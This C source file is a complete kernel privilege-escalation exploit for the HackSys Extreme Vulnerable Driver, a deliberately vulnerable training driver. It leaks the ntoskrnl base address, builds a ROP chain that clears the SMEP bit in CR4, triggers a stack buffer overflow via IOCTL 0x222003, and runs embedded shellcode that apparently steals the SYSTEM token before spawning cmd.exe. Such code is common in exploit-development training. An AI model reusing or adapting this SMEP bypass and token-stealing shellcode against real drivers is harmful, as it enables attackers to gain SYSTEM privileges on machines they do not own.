#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <Psapi.h>
#include <stdlib.h>

#pragma comment(lib, "Psapi.lib")

#define QWORD ULONGLONG

// Defining the STACK_OVERFLOW IOCTL and the DeviceName
#define HEVD_IOCTL_STACK_OVERFLOW 0x222003
#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"

// Offset to overflow
#define OFFSET 2072

// NTBASE address from `ropper`
#define NT_STATIC_BASE          0x140000000ULL

// ROP Gadgets from `ropper`
#define POP_RCX_STATIC          0x00000001402471d4ULL
#define MOV_CR4_RCX_STATIC      0x000000014039e637ULL

// Subtracting the static base address from ROP gadget to get the offsets
#define POP_RCX_OFFSET          (POP_RCX_STATIC - NT_STATIC_BASE)
#define MOV_CR4_RCX_OFFSET      (MOV_CR4_RCX_STATIC - NT_STATIC_BASE)

// Defining payload size
#define ROP_CHAIN_QWORDS 4
#define PAYLOAD_SIZE (OFFSET + (ROP_CHAIN_QWORDS * sizeof(QWORD)))

// SMEP instructions current and required
#define CURRENT_CR4 0x3506f8ULL
#define SMEP_MASK   0x100000ULL

// Finding NT Base address
QWORD getBaseAddr(LPCWSTR driverName)
{
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;

    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
    {
        printf("[!] EnumDeviceDrivers failed: %lu\n", GetLastError());
        return 0;
    }

    int driverCount = cbNeeded / sizeof(drivers[0]);

    for (int i = 0; i < driverCount; i++)
    {
        WCHAR currentDriverName[MAX_PATH];

        if (GetDeviceDriverBaseNameW(
            drivers[i],
            currentDriverName,
            MAX_PATH
        ))
        {
            if (_wcsicmp(currentDriverName, driverName) == 0)
            {
                return (QWORD)drivers[i];
            }
        }
    }

    printf("[!] Could not find driver: %ws\n", driverName);
    return 0;
}

int main()
{
    printf("[+] Opening %ls\n", DEVICE_NAME);

    // Creating a handle
    HANDLE hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFileW failed. Error=%lu\n", GetLastError());
        return 1;
    }

	// Finding ntoskrnl.exe base address
    QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");

    if (!ntBase)
    {
        printf("[-] Failed to get ntoskrnl.exe base address\n");
        CloseHandle(hDevice);
        return 1;
    }

	// Base address + offset to get the actual gadget addresses at runtime
    QWORD POP_RCX = ntBase + POP_RCX_OFFSET;
    QWORD MOV_CR4_RCX = ntBase + MOV_CR4_RCX_OFFSET;

	// Flipping the SMEP bit in CR4 to disable it
    QWORD cr4_without_smep = CURRENT_CR4 & ~SMEP_MASK;

    printf("[+] ntoskrnl.exe base:      0x%llx\n", ntBase);
    printf("[+] pop rax; ret:          0x%llx\n", POP_RCX);
    printf("[+] mov cr4, rax; ret:     0x%llx\n", MOV_CR4_RCX);
    printf("[+] Current CR4:            0x%llx\n", CURRENT_CR4);
    printf("[+] CR4 without SMEP:       0x%llx\n", cr4_without_smep);

    DWORD bytesReturned = 0;

    unsigned char request[PAYLOAD_SIZE];

    unsigned char shellcode[] = {
    0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00,
    0x49, 0x89, 0xc4, 0x4d, 0x8b, 0xa4, 0x24, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xec, 0x48, 0x04,
    0x00, 0x00, 0x4d, 0x8b, 0xac, 0x24, 0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xfd, 0x04, 0x75, 0xe3,
    0x4d, 0x8b, 0xac, 0x24, 0xb8, 0x04, 0x00, 0x00, 0x49, 0x83, 0xe5, 0xf0, 0x4c, 0x89, 0xa8, 0xb8,
    0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4,
    0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90,
    0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01,
    0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00,
    0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07
    };

    unsigned int shellcode_len = sizeof(shellcode);

    LPVOID shellcodeAddress = VirtualAlloc(
        nullptr,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (shellcodeAddress == nullptr)
    {
        printf("[-] VirtualAlloc failed. Error=%lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    memcpy(shellcodeAddress, shellcode, sizeof(shellcode));

    memset(request, 'A', sizeof(request));

	// Constructing the ROP chain to disable SMEP and execute the shellcode
    QWORD ropChain[ROP_CHAIN_QWORDS];

    int index = 0;

    ropChain[index++] = POP_RCX;
    ropChain[index++] = cr4_without_smep;
    ropChain[index++] = MOV_CR4_RCX;
    ropChain[index++] = (QWORD)shellcodeAddress;

    memcpy(request + OFFSET, ropChain, sizeof(ropChain));

    printf("[+] Payload size:           0x%llx bytes\n", (QWORD)sizeof(request));
    printf("[+] Overflow offset:        %d\n", OFFSET);

    printf("[+] ROP chain:\n");
    printf("    [0] pop rcx; ret        0x%llx\n", ropChain[0]);
    printf("    [1] new CR4             0x%llx\n", ropChain[1]);
    printf("    [2] mov cr4, rcx; ret   0x%llx\n", ropChain[2]);
    printf("    [3] shellcode           0x%llx\n", ropChain[3]);

    printf("[+] Sending vulnerable IOCTL: 0x%X for STACK_BUFFER_OVERFLOW\n", HEVD_IOCTL_STACK_OVERFLOW);
    printf("[+] Shellcode size = 0x%X bytes\n", shellcode_len);
    printf("[+] Shellcode address = 0x%p\n", shellcodeAddress);

    BOOL ok = DeviceIoControl(
        hDevice,
        HEVD_IOCTL_STACK_OVERFLOW,
        request,
        sizeof(request),
        nullptr,
        0,
        &bytesReturned,
        nullptr
    );

    if (!ok)
    {
        wprintf(L"[-] DeviceIoControl failed. Error=%lu\n", GetLastError());
    }
    else
    {
        wprintf(L"[+] DeviceIoControl returned successfully\n");
    }

    printf("[+] Spawning cmd.exe\n");
    system("cmd.exe");

    CloseHandle(hDevice);

    return 0;
}